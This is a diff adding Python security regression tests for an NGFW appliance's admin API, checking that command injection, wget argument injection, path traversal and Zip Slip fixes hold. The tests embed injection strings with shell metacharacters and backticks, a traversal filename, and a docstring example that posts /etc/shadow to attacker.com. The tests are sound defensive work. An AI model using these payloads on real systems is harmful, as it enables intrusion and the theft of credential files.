@@ -20,6 +20,7 @@ import fnmatch
 import base64
 
 from urllib.parse import urlparse, parse_qs
+from jsonrpc import JSONRPCException
 from tests.common import NGFWTestCase
 import tests.global_functions as global_functions
 import runtests.test_registry as test_registry
@@ -982,6 +983,52 @@ class UvmTests(NGFWTestCase):
                                                'login', 'admin' )
         assert( found )
 
+    def test_111_hosts_file_manager_injection_blocked(self):
+        """
+        Verify that shell metacharacters in NetworkSettings.hostName are rejected
+        by @SafeCheck at the JSON-RPC boundary BEFORE refreshHostsFile() runs.
+
+        REWRITTEN for NGFW-15741: NetworkSettings.hostName is annotated
+        @SafeCheck(SafeType.HOSTNAME) — the regex rejects ';', spaces, and every
+        shell metacharacter. setNetworkSettings raises SafeCheckValidationException
+        (JSON-RPC code 490) at the preInvokeCallback. The malicious hostname never
+        reaches the on-disk hosts file or refreshHostsFile()'s exec sink.
+
+        Defense-in-depth: even if a future regex regression let a payload through,
+        HostsFileManagerImpl uses execCommand(argv) so the shell would never
+        interpret the metacharacters. The poc_file assertion remains as a
+        regression guard for that layer.
+        """
+        # No dots in the path: sanitizeNetworkSettings strips everything after the
+        # first dot in the hostname, so a path like "/tmp/poc.txt" would become
+        # "/tmp/poc" and the wrong file would be checked (false negative).
+        poc_file = "/tmp/hosts_injection_poc"
+        status_file = "/var/lib/interface-status/test_injection_trigger"
+        subprocess.call(f"rm -f {poc_file} {status_file}", shell=True)
+
+        orig_netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
+        try:
+            malicious_settings = copy.deepcopy(orig_netsettings)
+            malicious_settings['hostName'] = "ngfw; touch " + poc_file + "; echo"
+
+            # Touch an interface-status file BEFORE setNetworkSettings so that if
+            # the hook EVER fires with the malicious hostname (regression), the
+            # exec path is exercised and the sentinel check below will catch it.
+            subprocess.call(f"mkdir -p /var/lib/interface-status && touch {status_file}", shell=True)
+
+            # Layer 1 — typed @SafeCheck must reject at the RPC boundary.
+            with pytest.raises(Exception):
+                global_functions.uvmContext.networkManager().setNetworkSettings(malicious_settings)
+        finally:
+            subprocess.call(f"rm -f {status_file}", shell=True)
+            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+
+        time.sleep(1)
+        # Layer 2 defense-in-depth — even if layer 1 was bypassed somehow,
+        # execCommand(argv) in refreshHostsFile() must not shell-expand.
+        assert not os.path.exists(poc_file), \
+            "Command injection succeeded via HostsFileManagerImpl.refreshHostsFile() (sentinel file was created)"
+
     # Make sure the HostsFileManager is working as expected
     def test_110_hosts_file_manager(self):
         # get the hostname and settings from the network manager
@@ -1040,7 +1087,343 @@ class UvmTests(NGFWTestCase):
 
         #compare original and modified certs
         assert(newline == newCertFileLines[1])
-        
+
+    def test_121_upload_restore_deprecated_endpoint_blocked(self):
+        """Verify /admin/upload rejects restore type with deprecation error (command injection fix)"""
+        poc_file = "/tmp/poc_backup.txt"
+        backup_file = "/tmp/untangleBackup.backup"
+        subprocess.call(f"rm -f {poc_file}", shell=True)
+
+        # Download a real backup file to use as the upload payload
+        result = subprocess.call(global_functions.build_wget_command(output_file=backup_file, post_data='type=backup', uri="http://localhost/admin/download"), shell=True)
+        assert result == 0, "Failed to download backup file for test"
+        with open(backup_file, "rb") as f:
+            backup_file_bytes = f.read()
+
+        malicious_argument = "poc`touch /tmp/poc_backup.txt`"
+        opener = global_functions.build_admin_http_opener(Login_username, Login_password)
+        boundary, body = global_functions.build_upload_multipart_body("restore", malicious_argument, backup_file_bytes, filename="poc.zip")
+
+        req = urllib.request.Request(
+            "http://localhost/admin/upload",
+            data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+        )
+        try:
+            response = opener.open(req)
+            response_text = response.read().decode()
+        except urllib.error.HTTPError as e:
+            response_text = e.read().decode()
+
+        response_json = json.loads(response_text)
+        # The fix makes /admin/upload return success=false with a deprecation message for restore
+        assert response_json.get("success") == False, \
+            f"Expected restore blocked on deprecated endpoint, got: {response_text}"
+        assert "deprecated" in response_json.get("msg", "").lower(), \
+            f"Expected deprecation message, got: {response_json.get('msg')}"
+
+        # Confirm no command was injected
+        time.sleep(1)
+        assert not os.path.exists(poc_file), \
+            "Command injection succeeded via /admin/upload (poc file was created)"
+
+    def test_122_v2_upload_restore_argument_injection_blocked(self):
+        """Verify /admin/v2/upload ignores malicious argument field (command injection fix)"""
+        poc_file = "/tmp/poc_backup.txt"
+        backup_file = "/tmp/untangleBackup.backup"
+        subprocess.call(f"rm -f {poc_file}", shell=True)
+
+        # Download a real backup file to use as the upload payload
+        result = subprocess.call(global_functions.build_wget_command(output_file=backup_file, post_data='type=backup', uri="http://localhost/admin/download"), shell=True)
+        assert result == 0, "Failed to download backup file for test"
+        with open(backup_file, "rb") as f:
+            backup_file_bytes = f.read()
+
+        # Corrupt the gzip magic bytes so ut-restore.sh -c rejects the file.
+        # This prevents an actual UVM restart while still exercising the full
+        # argument-sanitisation path (getRegExFromExceptions is called before
+        # the check script runs, which is where injection would have occurred).
+        backup_file_bytes = b'\x00\x00' + backup_file_bytes[2:]
+
+        malicious_argument = "poc`touch /tmp/poc_backup.txt`"
+        opener = global_functions.build_admin_http_opener(Login_username, Login_password)
+        boundary, body = global_functions.build_upload_v2_multipart_body("restore", malicious_argument, backup_file_bytes)
+
+        req = urllib.request.Request(
+            "http://localhost/admin/v2/upload",
+            data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+        )
+        try:
+            response = opener.open(req)
+            response_text = response.read().decode()
+        except urllib.error.HTTPError as e:
+            response_text = e.read().decode()
+
+        # Give time for any asynchronous command to execute if injection had occurred
+        time.sleep(2)
+
+        # The key assertion: argument field must not have been used as a shell argument
+        assert not os.path.exists(poc_file), \
+            "Command injection succeeded via /admin/v2/upload argument field (poc file was created)"
+
+    def test_128_v2_upload_unknown_arg_rejected(self):
+        """
+        Verify the v2 upload servlet strict-rejects any form-field key not
+        declared in the handler's getArgumentTypes() schema.
+
+        This closes the v2 extra-field smuggling class: any future v2 handler
+        that reads args.get("destPath") or similar would otherwise be RCE-
+        vulnerable. After C3, the boundary rejects unknown keys before the
+        handler runs.
+        """
+        backup_file = "/tmp/untangleBackup.backup"
+        result = subprocess.call(global_functions.build_wget_command(
+            output_file=backup_file, post_data='type=backup', uri="http://localhost/admin/download"), shell=True)
+        assert result == 0, "Failed to download backup file for test"
+        with open(backup_file, "rb") as f:
+            backup_file_bytes = f.read()
+
+        opener = global_functions.build_admin_http_opener(Login_username, Login_password)
+        # Send a bogus 'evil' field that's not in RestoreUploadHandler's schema.
+        boundary, body = global_functions.build_upload_v2_multipart_body_with_args(
+            "restore", {"evil": "value"}, backup_file_bytes)
+
+        req = urllib.request.Request(
+            "http://localhost/admin/v2/upload",
+            data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+        )
+        try:
+            response = opener.open(req)
+            response_text = response.read().decode()
+        except urllib.error.HTTPError as e:
+            response_text = e.read().decode()
+
+        response_json = json.loads(response_text)
+        assert response_json.get("success") == False, \
+            f"Expected unknown-arg rejection, got: {response_text}"
+        assert "Unknown argument" in (response_json.get("msg") or ""), \
+            f"Expected 'Unknown argument' in message, got: {response_json.get('msg')}"
+
+    def test_130_v2_upload_exceptions_field_accepted(self):
+        """
+        Regression test for the RESERVED_KEYS filter and the RestoreUploadHandler
+        schema declaration. The 'exceptions' arg is in the schema, and 'type' is
+        a reserved key (filtered before strict-rejection); this request must
+        reach the handler and fail downstream (corrupted backup magic) rather
+        than be rejected at the boundary.
+        """
+        backup_file = "/tmp/untangleBackup.backup"
+        result = subprocess.call(global_functions.build_wget_command(
+            output_file=backup_file, post_data='type=backup', uri="http://localhost/admin/download"), shell=True)
+        assert result == 0, "Failed to download backup file for test"
+        with open(backup_file, "rb") as f:
+            backup_file_bytes = f.read()
+        # Corrupt magic bytes so ut-restore.sh -c rejects the file (same trick
+        # test_122 uses to short-circuit before any actual UVM restart).
+        backup_file_bytes = b'\x00\x00' + backup_file_bytes[2:]
+
+        opener = global_functions.build_admin_http_opener(Login_username, Login_password)
+        boundary, body = global_functions.build_upload_v2_multipart_body_with_args(
+            "restore", {"exceptions": "network"}, backup_file_bytes)
+
+        req = urllib.request.Request(
+            "http://localhost/admin/v2/upload",
+            data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+        )
+        try:
+            response = opener.open(req)
+            response_text = response.read().decode()
+        except urllib.error.HTTPError as e:
+            response_text = e.read().decode()
+
+        response_json = json.loads(response_text)
+        msg = response_json.get("msg") or ""
+        # Validation MUST have passed - the request reached the handler. Anything
+        # other than "Unknown argument" / "Invalid argument" indicates the
+        # boundary let it through.
+        assert "Unknown argument" not in msg, \
+            f"'exceptions' was wrongly rejected at the boundary: {response_text}"
+        assert "Invalid argument" not in msg, \
+            f"'exceptions=network' was wrongly rejected at the boundary: {response_text}"
+
+    def test_126_v1_upload_filename_traversal_blocked(self):
+        """
+        Verify the v1 upload servlet drops the user-supplied Content-Disposition
+        filename and exposes only a sanitized name to the handler.
+
+        Posts a tunnel_vpn upload with filename='../../tmp/poc.zip'. After C2,
+        the servlet wraps the FileItem so the handler sees getName() == 'upload.zip'
+        and writes via File.createTempFile(), so /tmp/poc.zip is never created.
+        """
+        poc_file = "/tmp/poc.zip"
+        subprocess.call(f"rm -f {poc_file}", shell=True)
+
+        opener = global_functions.build_admin_http_opener(Login_username, Login_password)
+        boundary, body = global_functions.build_upload_multipart_body(
+            "tunnel_vpn", "", b"x" * 16, filename="../../tmp/poc.zip")
+
+        req = urllib.request.Request(
+            "http://localhost/admin/upload",
+            data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+        )
+        try:
+            opener.open(req).read()
+        except urllib.error.HTTPError as e:
+            e.read()
+
+        time.sleep(1)
+        assert not os.path.exists(poc_file), \
+            "Path traversal succeeded via /admin/upload Content-Disposition filename (file was created at /tmp/poc.zip)"
+
+    def test_123_connectivity_tester_dns_injection_blocked(self):
+        """
+        Verify that shell metacharacters in UriManagerSettings.dnsTestHost are
+        rejected by @SafeCheck at the JSON-RPC boundary BEFORE ConnectivityTester
+        runs its DNS probe.
+
+        REWRITTEN for NGFW-15741: UriManagerSettings.dnsTestHost is annotated
+        @SafeCheck(SafeType.HOSTNAME) — the regex rejects ';', space, and every
+        shell metacharacter. uriManager().setSettings raises
+        SafeCheckValidationException at the preInvokeCallback before the value
+        is stored. The connectivity-tester probe never sees the malicious host.
+
+        Defense-in-depth: even if a future regex regression let a payload
+        through, ConnectivityTesterImpl uses execCommand(argv) so the shell
+        cannot expand the metacharacters. The poc_file assertion remains as a
+        regression guard for that layer.
+        """
+        poc_file = "/tmp/conn_dns_injection_test.txt"
+        subprocess.call(f"rm -f {poc_file}", shell=True)
+
+        orig_uri_settings = global_functions.uvmContext.uriManager().getSettings()
+        try:
+            malicious_uri_settings = copy.deepcopy(orig_uri_settings)
+            malicious_uri_settings['dnsTestHost'] = "updates.edge.arista.com; touch " + poc_file
+
+            # Layer 1 — typed @SafeCheck must reject at the RPC boundary.
+            with pytest.raises(Exception):
+                global_functions.uvmContext.uriManager().setSettings(malicious_uri_settings)
+
+            # Defense-in-depth — exercise the connectivity tester anyway.
+            # If layer 1 was bypassed, the probe would fire with the malicious
+            # dnsTestHost and the sentinel check below would catch it.
+            global_functions.uvmContext.getConnectivityTester().getStatus()
+        finally:
+            global_functions.uvmContext.uriManager().setSettings(orig_uri_settings)
+
+        time.sleep(1)
+        assert not os.path.exists(poc_file), \
+            "Command injection succeeded via ConnectivityTesterImpl dnsTestHost (sentinel file was created)"
+
+    def test_124_connectivity_tester_dns_server_injection_blocked(self):
+        """
+        Verify that the DNS server address field (v4StaticDns1) is validated as an
+        InetAddress, preventing shell injection strings from being stored or executed
+        by ConnectivityTesterImpl.
+
+        The v4StaticDns1 field is typed as InetAddress on the server side, so the
+        JSON-RPC layer will reject any value that is not a valid IP address.  The
+        test confirms that attempting to store a malicious DNS value raises a
+        JSONRPCException (the expected API-level rejection) and that the injected
+        command is never executed.
+        """
+        poc_file = "/tmp/conn_server_injection_test.txt"
+        subprocess.call(f"rm -f {poc_file}", shell=True)
+
+        orig_netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
+        try:
+            malicious_settings = copy.deepcopy(orig_netsettings)
+            for iface in malicious_settings.get('interfaces', {}).get('list', []):
+                if iface.get('isWan'):
+                    iface['v4StaticDns1'] = "8.8.8.8; touch " + poc_file
+                    break
+            try:
+                global_functions.uvmContext.networkManager().setNetworkSettings(malicious_settings)
+            except JSONRPCException:
+                # Expected: the server rejects the malicious value because v4StaticDns1
+                # is unmarshalled as InetAddress, which only accepts valid IP addresses.
+                pass
+        finally:
+            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+
+        time.sleep(1)
+        assert not os.path.exists(poc_file), \
+            "Command injection succeeded via network settings DNS field (sentinel file was created)"
+
+    def test_125_wget_argument_injection_blocked(self):
+        """
+        Verify that downloadUpgrades() validates each URL before passing it to wget,
+        preventing wget argument injection attacks such as:
+
+            --post-file=/etc/shadow http://attacker.com
+
+        Attack surface: execEvil(String) in ExecManagerImpl splits the command string
+        using StringTokenizer (whitespace), so any wget flag embedded in the URL
+        becomes a real argv token received by wget.
+
+        The test temporarily replaces ut-system-mgr-helpers.sh so its downloadUpgrades
+        function outputs a crafted single-quoted entry:
+
+            '--output-file=<poc_file> http://127.0.0.1/'
+
+        After Java strips the surrounding single-quotes (line.substring(1, len-1)), the
+        remaining string is split by StringTokenizer into two tokens:
+            token 1: --output-file=<poc_file>
+            token 2: http://127.0.0.1/
+
+        wget treats token 1 as a real flag and writes its log to poc_file.
+        Crucially, --output-file creates the log file even when the HTTP connection
+        is refused, making this a reliable PoC indicator independent of network state.
+
+        With the fix (each URL validated against ^https?://\\S+$ before the wget
+        call): the malicious entry is rejected, wget is never invoked with the
+        injected flag, and the sentinel file is not created.
+        """
+        poc_file = "/tmp/wget_arg_injection_poc.txt"
+        helper_script = "/usr/share/untangle/bin/ut-system-mgr-helpers.sh"
+        backup_script = helper_script + ".bak_wget_injection_test"
+
+        subprocess.call(f"rm -f {poc_file}", shell=True)
+
+        # Mock script: downloadUpgrades outputs one malicious single-quoted entry.
+        # Real script format:  'https://repo.example.com/pkg.deb'
+        # Injected format:     '--output-file=<poc_file> http://127.0.0.1/'
+        # After Java strips quotes the injected flags reach wget as real argv tokens.
+        mock_script = (
+            "#!/bin/bash\n"
+            "downloadUpgrades()\n"
+            "{\n"
+            "    echo \"'--output-file=" + poc_file + " http://127.0.0.1/'\"\n"
+            "}\n"
+            "upgradesAvailable() { apt-get -s dist-upgrade | grep -q '^Inst'; }\n"
+            "diskHealthCheck() { python3 /usr/lib/python3/dist-packages/uvm/disk_health.py; }\n"
+            '$1 "$@"\n'
+        )
+
+        try:
+            subprocess.call(f"cp {helper_script} {backup_script}", shell=True)
+            with open(helper_script, 'w') as f:
+                f.write(mock_script)
+            subprocess.call(f"chmod +x {helper_script}", shell=True)
+
+            # downloadUpgrades() will return False (wget exit ≠ 0 for 127.0.0.1),
+            # but we only care whether the sentinel file was created.
+            global_functions.uvmContext.systemManager().downloadUpgrades()
+        finally:
+            subprocess.call(f"mv {backup_script} {helper_script}", shell=True)
+
+        time.sleep(1)
+        assert not os.path.exists(poc_file), (
+            "wget argument injection succeeded: the injected --output-file flag was "
+            "accepted by wget (sentinel file created at " + poc_file + "). "
+            "Each URL must be validated against ^https?://\\S+$ before being passed "
+            "to execEvil() in SystemManagerImpl.downloadUpgrades()."
+        )
+
     def test_130_check_cmd_connected(self):
         """Check if cmd is connected using alert rule"""
         # Enable cloud connection  
@@ -1533,5 +1916,74 @@ class UvmTests(NGFWTestCase):
             print(f"Expected redirect_uri: {expected.get('redirect_uri')}, actual: {redirect_uri}")
 
         assert(result)
+
+    def test_125_backup_restore_zipslip_blocked(self):
+        """
+        Verify that a crafted backup file with path traversal entries
+        (files outside usr/share/untangle/settings/) is rejected by
+        ut-restore.sh and does not extract malicious files to the filesystem.
+        """
+        malicious_file = "/tmp/zipslip_test_proof"
+        backup_file = "/tmp/test_backup.backup"
+        work_dir = "/tmp/zipslip_test_workdir"
+        subprocess.call(f"rm -f {malicious_file} {backup_file}", shell=True)
+        subprocess.call(f"rm -rf {work_dir}", shell=True)
+
+        try:
+            # Step 1: Download a legitimate backup
+            result = subprocess.call(
+                global_functions.build_wget_command(
+                    output_file=backup_file,
+                    post_data='type=backup',
+                    uri="http://localhost/admin/download"),
+                shell=True)
+            assert result == 0, "Failed to download backup"
+
+            # Step 2: Craft a malicious backup with a file outside settings/
+            os.makedirs(work_dir, exist_ok=True)
+
+            # Extract the outer tar
+            subprocess.call(f"tar xzf {backup_file} -C {work_dir}", shell=True)
+
+            # Find the inner files tarball
+            inner_tarball = glob.glob(f"{work_dir}/files-*.tar.gz")[0]
+            inner_name = os.path.basename(inner_tarball)
+
+            # Extract inner tarball, add malicious entry, repack
+            inner_dir = f"{work_dir}/inner"
+            os.makedirs(inner_dir, exist_ok=True)
+            subprocess.call(f"tar xzf {inner_tarball} -C {inner_dir}", shell=True)
+
+            # Add a file that would write to /tmp/ (outside settings/)
+            os.makedirs(f"{inner_dir}/tmp", exist_ok=True)
+            with open(f"{inner_dir}/tmp/zipslip_test_proof", "w") as f:
+                f.write("ZIPSLIP_PROOF")
+
+            # Repack inner tarball
+            subprocess.call(
+                f"tar czf {work_dir}/{inner_name} -C {inner_dir} .",
+                shell=True)
+
+            # Repack outer backup
+            subprocess.call(
+                f"tar czf {backup_file} -C {work_dir} ./PUBVERSION ./{inner_name}",
+                shell=True)
+
+            # Step 3: Run ut-restore.sh in check+restore mode
+            # Use the restore script directly with -c (check) first
+            restore_result = subprocess.run(
+                ["/usr/share/untangle/bin/ut-restore.sh", "-i", backup_file, "-v", "-c"],
+                capture_output=True, text=True, timeout=30)
+
+            # Step 4: Validate restore script rejected the file
+            assert restore_result.returncode != 0, \
+                "Restore script should have rejected backup with files outside usr/share/untangle/settings/"
+            assert not os.path.exists(malicious_file), \
+                "Zip Slip: malicious file was extracted to /tmp/zipslip_test_proof"
+
+        finally:
+            subprocess.call(f"rm -f {malicious_file} {backup_file}", shell=True)
+            subprocess.call(f"rm -rf {work_dir}", shell=True)
+
 
 test_registry.register_module("uvm", UvmTests)
